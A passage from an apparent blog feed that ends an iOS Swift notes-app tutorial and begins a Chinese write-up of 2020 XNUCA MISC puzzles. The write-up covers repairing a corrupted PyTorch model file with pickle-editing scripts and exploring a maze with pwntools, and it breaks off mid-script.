alertNotifyUser(message: <span class="string">"This device has no camera."</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        imagePickerController.sourceType = .camera</span><br><span class="line">        imagePickerController.delegate = <span class="keyword">self</span></span><br><span class="line">        present(imagePickerController, animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从本地选择</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">selectPhotoFromLibrary</span><span class="params">()</span></span> &#123;</span><br><span class="line">        imagePickerController.sourceType = .photoLibrary</span><br><span class="line">        imagePickerController.delegate = <span class="keyword">self</span></span><br><span class="line">        present(imagePickerController, animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">imagePickerController</span><span class="params">(<span class="number">_</span> picker: UIImagePickerController, didFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey : <span class="keyword">Any</span>])</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> &#123;</span><br><span class="line">            imagePickerController.dismiss(animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> selectedImage = info[<span class="type">UIImagePickerController</span>.<span class="type">InfoKey</span>.originalImage] <span class="keyword">as</span>? <span class="type">UIImage</span> <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        image = selectedImage</span><br><span class="line">        imageView.image = image</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note = note &#123;</span><br><span class="line">            note.image = selectedImage</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">alertNotifyUser</span><span class="params">(message: String)</span></span> &#123;</span><br><span class="line">        <span class="keyword">let</span> alert = <span class="type">UIAlertController</span>(title: <span class="string">"Alert"</span>, message: message, preferredStyle: .alert)</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">"OK"</span>, style: .<span class="keyword">default</span>, handler: <span class="literal">nil</span>))</span><br><span class="line">        <span class="keyword">self</span>.present(alert, animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 保存图文笔记信息到本地</span></span><br><span class="line">    <span class="meta">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">save</span><span class="params">(<span class="number">_</span> sender: <span class="keyword">Any</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> title = titleTextField.text?.trimmingCharacters(<span class="keyword">in</span>: .whitespaces), !title.isEmpty <span class="keyword">else</span> &#123;</span><br><span class="line">            alertNotifyUser(message: <span class="string">"Please enter a title before saving the note."</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// if an existing note, update it</span></span><br><span class="line">        <span class="comment">// otherwise, create a new note</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note = note &#123;</span><br><span class="line">            note.title = title</span><br><span class="line">            note.body = bodyTextView.text</span><br><span class="line">            note.image = image</span><br><span class="line">            <span class="comment">// addDate is set when the Note is initialized</span></span><br><span class="line">            <span class="comment">// for existing note, the addDate stays the same as initially set</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            note = <span class="type">ImageNote</span>(title: title, body: bodyTextView.text, image: image)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// If a note exists, save it.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note = note &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> managedContext = note.managedObjectContext</span><br><span class="line">                <span class="keyword">try</span> managedContext?.save()</span><br><span class="line">            &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">                alertNotifyUser(message: <span class="string">"The note could not be saved."</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            alertNotifyUser(message: <span class="string">"The note could not be created."</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Return to list of Notes.</span></span><br><span class="line">        navigationController?.popViewController(animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="日期记事"><a href="#日期记事" class="headerlink" title="日期记事"></a>日期记事</h2><h3 id="日期列表界面"><a href="#日期列表界面" class="headerlink" title="日期列表界面"></a>日期列表界面</h3><p>DataViewController.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataViewController</span>: <span class="title">UIViewController</span>, <span class="title">UITableViewDataSource</span>, <span class="title">UITableViewDelegate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> expenses : [<span class="type">Expense</span>] = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> context = (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as</span>! <span class="type">AppDelegate</span>).persistentContainer.viewContext</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> <span class="type">DataTableView</span>: <span class="type">UITableView!</span></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        <span class="type">DataTableView</span>.delegate = <span class="keyword">self</span></span><br><span class="line">        <span class="type">DataTableView</span>.dataSource = <span class="keyword">self</span></span><br><span class="line">        navigationItem.title = <span class="string">"Clock Note"</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillAppear</span><span class="params">(<span class="number">_</span> animated: Bool)</span></span> &#123;</span><br><span class="line">        <span class="comment">//get data from coredata</span></span><br><span class="line">        getData()</span><br><span class="line">        <span class="comment">//reload table view</span></span><br><span class="line">        <span class="type">DataTableView</span>.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">addExpenses</span><span class="params">(<span class="number">_</span> sender: <span class="keyword">Any</span>)</span></span> &#123;</span><br><span class="line">        performSegue(withIdentifier: <span class="string">"ShowExpenses"</span>, sender: <span class="keyword">self</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, numberOfRowsInSection section: Int)</span></span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> expenses.<span class="built_in">count</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, cellForRowAt indexPath: IndexPath)</span></span> -&gt; <span class="type">UITableViewCell</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cell = <span class="type">DataTableView</span>.dequeueReusableCell(withIdentifier: <span class="string">"expensesCell"</span>, <span class="keyword">for</span>: indexPath) <span class="keyword">as</span>! <span class="type">ExpensesCell</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> expense = expenses[indexPath.row]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> title = expense.name &#123;</span><br><span class="line">            cell.titleLabel.text = title</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cell.amountLabel.text = <span class="string">"\(expense.amount)"</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> date = expense.date &#123;</span><br><span class="line">            <span class="keyword">let</span> dateFormatter = <span class="type">DateFormatter</span>()</span><br><span class="line">            dateFormatter.dateFormat = <span class="string">"yyyy-MM-dd hh:mm a"</span></span><br><span class="line">            cell.dateLabel.text = dateFormatter.string(from: date)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> cell</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, didSelectRowAt indexPath: IndexPath)</span></span> &#123;</span><br><span class="line">        <span class="comment">//performSegue(withIdentifier: "ShowExpenses", sender: self)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, heightForRowAt indexPath: IndexPath)</span></span> -&gt; <span class="type">CGFloat</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">getData</span><span class="params">()</span></span> &#123;</span><br><span class="line">       <span class="keyword">do</span> &#123;</span><br><span class="line">            expenses = <span class="keyword">try</span> context.fetch(<span class="type">Expense</span>.fetchRequest())</span><br><span class="line">        &#125;<span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"fetchingFailed"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span><span class="params">(<span class="number">_</span> tableView: UITableView, commit editingStyle: UITableViewCell.EditingStyle, forRowAt indexPath: IndexPath)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> editingStyle == .delete &#123;</span><br><span class="line">            <span class="keyword">let</span> expense = expenses[indexPath.row]</span><br><span class="line">            context.delete(expense)</span><br><span class="line">            (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as</span>! <span class="type">AppDelegate</span>).saveContext()</span><br><span class="line">            </span><br><span class="line">            getData()</span><br><span class="line">        &#125;</span><br><span class="line">        tableView.reloadData()</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="日期列表中的小条目"><a href="#日期列表中的小条目" class="headerlink" title="日期列表中的小条目"></a>日期列表中的小条目</h4><p>ExpensesCell.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExpensesCell</span>: <span class="title">UITableViewCell</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> titleLabel: <span class="type">UILabel!</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> amountLabel: <span class="type">UILabel!</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> dateLabel: <span class="type">UILabel!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">awakeFromNib</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.awakeFromNib()</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="日期详情界面"><a href="#日期详情界面" class="headerlink" title="日期详情界面"></a>日期详情界面</h3><p>AddDataViewController.swift</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddDataViewController</span>: <span class="title">UIViewController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> nameTextField: <span class="type">UITextField!</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> amountTextField: <span class="type">UITextField!</span></span><br><span class="line">    <span class="meta">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> datePicker: <span class="type">UIDatePicker!</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    <span class="meta">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">saveExpenses</span><span class="params">(<span class="number">_</span> sender: <span class="keyword">Any</span>)</span></span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> context = (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as</span>! <span class="type">AppDelegate</span>).persistentContainer.viewContext</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> expense = <span class="type">Expense</span>(context: context)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> name = nameTextField.text &#123;</span><br><span class="line">            expense.name = name</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> amount = amountTextField.text &#123;</span><br><span class="line">            expense.amount =  (amount <span class="keyword">as</span> <span class="type">NSString</span>).doubleValue</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         expense.date = datePicker.date</span><br><span class="line">    </span><br><span class="line">        (<span class="type">UIApplication</span>.shared.delegate <span class="keyword">as</span>! <span class="type">AppDelegate</span>).saveContext()</span><br><span class="line">       navigationController?.popViewController(animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">touchesBegan</span><span class="params">(<span class="number">_</span> touches: Set&lt;UITouch&gt;, with event: UIEvent?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.view.endEditing(<span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="iOS" scheme="http://xibai.xyz/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://xibai.xyz/tags/iOS/"/>
    
      <category term="code" scheme="http://xibai.xyz/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>2020-XNUCA Writeup(MISC)</title>
    <link href="http://xibai.xyz/2020/11/01/2020XNUCA/"/>
    <id>http://xibai.xyz/2020/11/01/2020XNUCA/</id>
    <published>2020-11-01T13:14:30.022Z</published>
    <updated>2021-05-16T05:42:19.736Z</updated>
    
    <content type="html"><![CDATA[<p>pg: 题目还行，感觉做的时候挺有意思的，就是自己做题时太憨憨导致全部错失一血呜呜呜<del>~</del></p><h2 id="torch-model"><a href="#torch-model" class="headerlink" title="torch model"></a>torch model</h2><p>题目要求环境: python==3.7.7 、torch == 1.5.0</p><p>给了一个神经网络学习的模型训练python脚本(<code>ipynb</code>格式)，直接vscode打开可以自动装相关环境一键查看，vscode还是香的。</p><p>查看ipynb可以知道该模型的作用是识别题目给出的图片为<code>flag</code>，<code>flag</code>长度和<code>sha256</code>已知。模型数据被保存为<code>model_state_dict.pt</code>，并且中间有一段数据用随机数据进行了覆盖修改，查看题目给出的<code>diff.png</code>以及<code>torch.save</code>的源码可知：修改了<code>torch</code>中<strong>保存模型数据信息的数据段</strong>，而且将<strong>模型数据字典中的键值名乱序保存进文件</strong>。pt文件中的数据用<code>pickle</code>打包。</p><p>至此题目信息查看完毕，题目解法为修复pt文件数据，用torch读取模型识别flag。<br>这里我们用两个同长度的字符串代替原flag，重新训练两个模型，并将其保存为两个正常的pt文件。然后<strong>对比两个pt文件保存模型数据信息数据段的十六进制</strong>，发现除了<code>serialized_storage_keys</code>的<code>key</code>的信息，其余结构基本一致。所以修复只需要将其中的<code>key</code>的键值名替换为题目文件中的<code>key</code>的键值名。对比图如下：</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102012727.png" alt="20201102012727"></p><p>提取题目模型文件和我们刚保存的模型文件中的<code>serialized_storage_keys</code>数据，并解包替换重新打包写回文件，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"./model_state_dict.pt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> model1:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./model_state_dict_test.pt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> model2:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"./model_state_dict_flag.pt"</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> model3:</span><br><span class="line">            model3.write(model1.read(<span class="number">0x89</span>))</span><br><span class="line">            model2.read(<span class="number">0x89</span>)</span><br><span class="line">            tmp_flag_obj = model1.read(<span class="number">0x4ef</span><span class="number">-0x89</span>)</span><br><span class="line">            tmp_test_obj = model2.read(<span class="number">0x4e5</span><span class="number">-0x89</span>)</span><br><span class="line">            tmp_flag_keys = model1.read(<span class="number">0x5c9</span><span class="number">-0x4ef</span>)</span><br><span class="line">            tmp_test_keys = model2.read(<span class="number">0x5b5</span><span class="number">-0x4e5</span>)</span><br><span class="line">            tmp1 = pickle.loads(tmp_flag_keys,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            tmp2 = pickle.loads(tmp_test_keys,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            print(tmp1)</span><br><span class="line">            print(tmp2)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp1)):</span><br><span class="line">                tmp_test_obj = tmp_test_obj.replace(bytes(tmp2[i],encoding=<span class="string">'utf-8'</span>),bytes(tmp1[i],encoding=<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">            model3.write(tmp_test_obj)</span><br><span class="line">            model3.write(tmp_flag_keys)</span><br><span class="line"></span><br><span class="line">            tmp = model1.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> tmp != <span class="string">b''</span>:</span><br><span class="line">                model3.write(tmp)</span><br><span class="line">                tmp = model1.read(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>接下来是踩坑时刻。用此脚本复现该题目的话会发现修复之后的pt文件依旧不能被加载。</p><p>注意看脚本可以发现，pt文件数据虽然全是用pickle打包的，但是对于模型的<code>obj</code>数据却没有选择解包替换，而是直接对被打包的数据进行了“带包”替换。这里如果有仔细分析<code>torch.save</code>的源码的话，就会知道，官方对于obj的数据自定义了一套pickler检查规则，这里是因为结构信息几乎完全一致，所以就没有去读官方定义的那套规则。不过这样的话就需要注意修改<code>obj</code>集合数据中打包的小结构体的一个关键数据：</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102014247.png" alt="20201102014247"></p><p>图中选中部分是为一个被打包的小结构体，每一个小结构体都是<code>obj</code>集合中的一个对象。结构体的<code>magic header</code>是单个字节的十六进制<code>\x71</code>,其后紧跟着的一个字节是这个结构体在<code>obj</code>集合中的顺序序号，上图选中的即为<code>\x2e</code>第46个结构体。这里注意下下图红色标记字节，从该字节开始的四个字节为<code>pickle</code>打包数据中一个集合内相关对象的名字的长度，小端序。这里是<code>\x0D\x00\x00\x00</code>，即长度为13，但是13其实是我生成新模型数据文件时新模型内的<code>key</code>的名字长度，如果去观察偏移<code>\x4ef</code>后的题目模型文件的<code>key</code>数据，会发现这些<code>9452xxxx</code>的键值名称长度其实都为14，这里因为数量较少，所以我手动修复了。此时pt文件中的模型关键信息已经修复完毕，torch已经可以解析加载pt文件。<br>(pg:这个长度不一样就离谱，第一天下午看题的时候一个下午都没发现自己把14数成13，结果别的师傅都把题刷烂了自己还纳闷题目文件为啥比自己生成的文件大了20字节，一直以为环境没配好反复配了几个小时环境，惨惨emmm)</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102014936.png" alt="20201102014936"></p><p>但是，还记得<strong>题目图片中的random</strong>嘛，这个东西还没用呢，还有坑。此时直接加载模型会发现如下报错：</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102015948.png" alt="20201102015948"></p><p>这里就是乱序储存导致<code>torch</code>在<code>load</code>模型训练数据时，<code>serialized_storage_keys</code>中的每个键值对应的那一部分模型数据长度与现在实际<code>load</code>解析得到的长度不一致导致的，这里它直接给出了应该是什么长度的键值。</p><blockquote><p>RuntimeError: storage has wrong size: expected 120 got 10</p></blockquote><p>120即为第一部分的长度，但此时第一个键值对应长度为十，这里可以直接去<code>torch.load</code>的源码那里，用一个<code>print</code>输出它解析到的<code>obj</code>信息，从而得到每个数字键值名对应的对象的数据长度，然后将pt文件中<code>\x4ef</code>偏移后的<code>keys</code>集合数据重新排序复写，这里给出脚本，因为就十条，所以没搞自动化嘤嘤嘤QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"./model_state_dict_flag.pt"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./tmp.pt"</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> o:</span><br><span class="line">        o.write(f.read(<span class="number">0x4ef</span>))</span><br><span class="line">        tmp = f.read(<span class="number">0x5c9</span><span class="number">-0x4ef</span>)</span><br><span class="line">        tmp = pickle.loads(tmp,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">        tmp = sorted(tmp)</span><br><span class="line">        tmp.remove(<span class="string">'94521743421392'</span>)</span><br><span class="line">        tmp.insert(<span class="number">0</span>,<span class="string">'94521743421392'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743421488'</span>)</span><br><span class="line">        tmp.insert(<span class="number">1</span>,<span class="string">'94521743421488'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743257408'</span>)</span><br><span class="line">        tmp.insert(<span class="number">2</span>,<span class="string">'94521743257408'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743706048'</span>)</span><br><span class="line">        tmp.insert(<span class="number">3</span>,<span class="string">'94521743706048'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521742563680'</span>)</span><br><span class="line">        tmp.insert(<span class="number">4</span>,<span class="string">'94521742563680'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521716638368'</span>)</span><br><span class="line">        tmp.insert(<span class="number">5</span>,<span class="string">'94521716638368'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743430240'</span>)</span><br><span class="line">        tmp.insert(<span class="number">6</span>,<span class="string">'94521743430240'</span>)</span><br><span class="line">        tmp.remove(<span class="string">'94521743916656'</span>)</span><br><span class="line">        tmp.insert(<span class="number">7</span>,<span class="string">'94521743916656'</span>)</span><br><span class="line"></span><br><span class="line">        tmp = pickle.dumps(tmp)</span><br><span class="line">        o.write(tmp)</span><br><span class="line">        tmp = f.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> tmp != <span class="string">b''</span>:</span><br><span class="line">            o.write(tmp)</span><br><span class="line">            tmp = f.read(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>至此，pt文件彻底修复，直接load然后加载图片即可获取flag</p><h2 id="catchthecat"><a href="#catchthecat" class="headerlink" title="catchthecat"></a>catchthecat</h2><p>考察数据结构算法。（ps：千万别乱找网上的轮子！自己造的真香！）<br>两个脚本解决，第一个遍历迷宫获取迷宫地图，第二个求迷宫两点最短路径（此处顺便还要看点运气emmm）</p><p>首先题目源码给出，根据源码可知地图除了墙还有炸弹，遇见炸弹直接game over。所以写探索迷宫的算法时要考虑到重连问题。这里我用pwntools + 深度优先算法遍历迷宫数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 